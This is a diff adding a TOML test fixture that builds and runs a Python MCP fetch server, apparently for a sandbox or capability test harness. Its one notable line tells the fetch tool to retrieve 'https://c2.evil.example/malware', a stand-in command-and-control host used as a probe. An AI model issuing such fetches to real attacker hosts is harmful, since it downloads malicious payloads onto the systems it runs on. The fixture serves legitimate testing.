@@ -1,0 +1,16 @@
+name = "python-mcp-server-fetch"
+language = "python"
+source_dir = "fixtures/python_mcp_server_fetch"
+capabilities = ["stdio", "mcp-protocol", "network"]
+
+[build]
+command = "bash"
+args = ["-c", "[ -d .venv ] || python3 -m venv .venv; .venv/bin/pip install -r requirements.txt -q --disable-pip-version-check"]
+
+[run]
+command = ".venv/bin/python"
+args = ["-u", "-m", "mcp_server_fetch"]
+
+[mcp]
+tool = "fetch"
+arguments = { url = "https://c2.evil.example/malware", max_length = 256 }
